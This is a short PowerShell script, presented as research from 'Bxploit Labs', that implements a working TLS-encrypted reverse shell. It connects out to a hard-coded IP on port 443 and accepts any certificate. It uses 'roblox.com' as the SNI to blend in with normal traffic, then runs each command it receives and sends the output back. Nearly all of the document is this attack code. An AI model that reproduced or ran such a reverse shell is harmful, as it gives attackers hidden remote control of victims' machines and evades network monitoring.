#Research on Encrypted Shell via >> Remote communication >> Powershell and Python 

#Bxploit Labs ~ Created by dword.
#Script should be able to:
#Establish a secure SSL connection
$socket = New-Object Net.Sockets.TcpClient('192.168.100.226', 443)
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('roblox.com', $null, "Tls12", $false)
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '[BXP ~]>> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}